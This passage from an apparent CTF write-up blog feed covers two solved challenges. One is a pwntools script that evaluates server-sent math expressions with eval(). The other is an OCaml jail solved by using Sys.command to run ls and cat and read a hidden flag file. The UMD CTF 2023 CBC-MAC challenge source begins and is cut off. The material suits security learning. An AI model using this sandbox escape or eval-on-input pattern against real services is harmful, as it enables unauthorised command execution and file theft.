&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;compute_integral&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;func&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;lower_limit&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;upper_limit&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    integral, error &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;quad&lt;&#x2F;span&gt;&lt;span&gt;(func&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;lower_limit&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;upper_limit)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;integral
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;x&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;eval&lt;&#x2F;span&gt;&lt;span&gt;(exp)
&lt;&#x2F;span&gt;&lt;span&gt;conn &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;remote&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;20.169.252.240&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4200&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;40&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;recvuntil&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;Evaluate the integral of: &amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    exp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;recvuntil&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39; &amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;decode&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;    r &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;recvuntil&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;.&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;decode&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strip&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;.&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    r &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;split&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot; &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    ranges &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(r[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;])&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(r[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;])]
&lt;&#x2F;span&gt;&lt;span&gt;    integral &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;compute_integral&lt;&#x2F;span&gt;&lt;span&gt;(f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;ranges[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;ranges[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;])
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(integral)
&lt;&#x2F;span&gt;&lt;span&gt;    conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;recv&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;    conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sendline&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(integral)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;39&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;recv&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# cvctf{B4by_m@7h_G14n7_5t3P}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : cvctf{B4by_m@7h_G14n7_5t3P}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;misc-1&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#misc-1&quot; aria-label=&quot;Anchor link for: misc-1&quot;&gt;Misc&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h1 id=&quot;ojail&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#ojail&quot; aria-label=&quot;Anchor link for: ojail&quot;&gt;OJail&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;cvctf23&#x2F;cvctf23_ojail.png&quot; alt=&quot;ojail&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Challenge&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;ojail$&lt;&#x2F;span&gt;&lt;span&gt; nc 20.169.252.240 4201
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;OCaml&lt;&#x2F;span&gt;&lt;span&gt; version 4.08.1
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# 
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Okay its time to learn &lt;code&gt;OCaml&lt;&#x2F;code&gt;. I quickly checked the Ocaml hello world program and tried it.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;ojail$&lt;&#x2F;span&gt;&lt;span&gt; nc 20.169.252.240 4201
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;OCaml&lt;&#x2F;span&gt;&lt;span&gt; version 4.08.1
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# print_string &amp;quot;hello world!\n&amp;quot;;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;hello&lt;&#x2F;span&gt;&lt;span&gt; world!
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt; : unit = ()
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# 
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Yes, it worked. So, I found that with  &lt;code&gt;Sys.command&lt;&#x2F;code&gt; we can executed the system commands. I tried with &lt;code&gt;ls&lt;&#x2F;code&gt;. I found that there were a flag.txt but it was not the correct one. Then looked into &lt;code&gt;secret&lt;&#x2F;code&gt; directory and catted out the &lt;code&gt;flag-1d573e0faa99.json&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;ojail$&lt;&#x2F;span&gt;&lt;span&gt; nc 20.169.252.240 4201
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;OCaml&lt;&#x2F;span&gt;&lt;span&gt; version 4.08.1
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Sys.command &amp;quot;ls&amp;quot;;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Dockerfile
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;build.sh
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;flag.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;secret
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt; : int = 0
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Sys.command &amp;quot;ls secret&amp;quot;;;       
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;flag-1d573e0faa99.json
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt; : int = 0
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Sys.command &amp;quot;cat secret&#x2F;flag-1d573e0faa99.json&amp;quot;;;
&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;message&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Flag is here. OCaml syntax is easy, right?&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;flag&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;cvctf{J41L3d_OOOO-C4mL@@}&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;}- : int = 0
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : cvctf{J41L3d_OOOO-C4mL@@}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>UMD CTF 2023</title>
        <published>2023-05-01T00:00:00+00:00</published>
        <updated>2023-05-01T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/writeups/umdctf23/"/>
        <id>https://themj0ln1r.github.io/writeups/umdctf23/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/writeups/umdctf23/">&lt;p&gt;Hi Readers!
I played &lt;a href= &quot;https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1949&quot; target=_blank&gt;UMDCTF 2023&lt;&#x2F;a&gt; which was happened from  29 Apr to 01 May. I played it with the team &lt;a href=&quot;https:&#x2F;&#x2F;ctftime.org&#x2F;team&#x2F;217079&quot;&gt;Invaders0x1&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;These are the writeups for the challenges I solved.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;crypto&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#crypto&quot; aria-label=&quot;Anchor link for: crypto&quot;&gt;Crypto&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h1 id=&quot;cbc-mac1&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#cbc-mac1&quot; aria-label=&quot;Anchor link for: cbc-mac1&quot;&gt;CBC-MAC1&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;umd23&#x2F;umdctf23_cbcmac1.png&quot; alt=&quot;cbcmac1&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Attached Files : &lt;a&gt;cbc-mac1.py&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;cbc-mac1.py&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;socket
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;threading
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;_thread &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;*
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;Crypto &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;Random
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;Crypto&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;Cipher &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;AES
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;binascii &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;hexlify&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;unhexlify
&lt;&#x2F;span&gt;&lt;span&gt;HOST &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;0.0.0.0&amp;#39;  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Standard loopback interface address (localhost)
&lt;&#x2F;span&gt;&lt;span&gt;PORT &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;60001        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Port to listen on (non-privileged ports are &amp;gt; 1023)
&lt;&#x2F;span&gt;&lt;span&gt;FLAG &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;flag.txt&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;r&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;read&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strip&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;MENU &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;What would you like to do?&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n\t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;(1) MAC Query&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n\t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;(2) Forgery&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n\t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;(3) Exit&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;Choice: &amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;INITIAL &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Team Rocket told me CBC-MAC with arbitrary-length messages is safe from forgery. If you manage to forge a message you haven&amp;#39;t queried using my oracle, I&amp;#39;ll give you something in return.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;BS &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16 &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Block Size
&lt;&#x2F;span&gt;&lt;span&gt;MAX_QUERIES &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;cbc_mac&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;key&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    iv &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x00&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;BS
&lt;&#x2F;span&gt;&lt;span&gt;    cipher &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;AES&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;new&lt;&#x2F;span&gt;&lt;span&gt;(key&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;AES&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;MODE_CBC&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;iv&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;iv)
&lt;&#x2F;span&gt;&lt;span&gt;    t &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;cipher&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encrypt&lt;&#x2F;span&gt;&lt;span&gt;(msg)[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;hexlify&lt;&#x2F;span&gt;&lt;span&gt;(t)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;threading&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;conn&lt;&#x2F;span&gt;&lt;span&gt;):
